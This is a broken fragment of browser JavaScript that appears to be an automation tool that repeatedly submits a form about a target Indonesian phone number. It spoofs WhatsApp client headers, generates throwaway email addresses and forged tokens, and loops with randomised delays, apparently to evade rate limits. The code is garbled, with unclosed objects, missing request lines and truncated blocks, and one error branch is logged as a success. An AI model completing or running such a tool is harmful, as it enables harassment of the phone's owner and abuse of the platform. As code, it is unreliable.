            return Math.floor(Math.random() * (CONFIG.delays.max - CONFIG.delays.min + 1)) + CONFIG.delays.min;
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        function generateEmail() {
            const prefixes = ['contact', 'support', 'user'];
            const randomStr = Math.random().toString(36).substring(2, 6);
            return `${prefixes[Math.floor(Math.random() * prefixes.length)]}${randomStr}${CONFIG.emailDomain}`;
        }

        function generateSecurityToken() {
            const array = new Uint8Array(16);
            window.crypto.getRandomValues(array);
            return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
        }

        // Main processing function
        async function processRequest(phone, attempt) {
            const securityToken = generateSecurityToken();
            const jazoest = `2${Math.floor(10000 + Math.random() * 90000)}`;

            const headers = {
                'Content-Type': 'application/x-www-form-urlencoded',

                'X-WhatsApp-Network-Type': 'wifi',
                'X-WhatsApp-Device-OS': 'Android',
                'X-WhatsApp-Version': '2.23.25.84'

            const payload = new URLSearchParams();
            payload.append('browser_data', JSON.stringify(CONFIG.browserData));
            payload.append('analytics_data', JSON.stringify(CONFIG.analyticsData));
            payload.append('account_params', JSON.stringify(CONFIG.accountParams));
            payload.append('server_nonce', JSON.stringify(CONFIG.serverNonce));
            payload.append('site_data', JSON.stringify(CONFIG.siteData));
            payload.append('phone_number', phone);
            payload.append('email', generateEmail());

            payload.append('jazoest', jazoest);
            payload.append('security_token', securityToken);
            payload.append('accept_terms', '1');

                    body: payload,
                    mode: 'cors',

                if (response.ok) {

                    if (data.includes('Thank you') || data.includes('success')) {

                return false;
            } catch (error) {

            const phone = phoneInput.value.trim();
            
            if (!/^\+62\d{9,13}$/.test(phone)) {

                return;

            isRunning = true;
            startBtn.disabled = true;

                currentAttempt++;
                try {
                    const result = await processRequest(phone, currentAttempt);
                    if (result) {
                        log(`✅[${currentAttempt}] Successfully sent!`, 'success');
                    } else {
                        log(`⚠️[${currentAttempt}] Retrying...`, 'warning');
                    }
                    await delay(getRandomDelay());
                } catch (error) {
                    log(`✅[${currentAttempt}] Error: ${error.message}`, 'success');
                    await delay(30000);
                }
            }
        }

        // Event listeners
        startBtn.addEventListener('click', () => {
            execute();
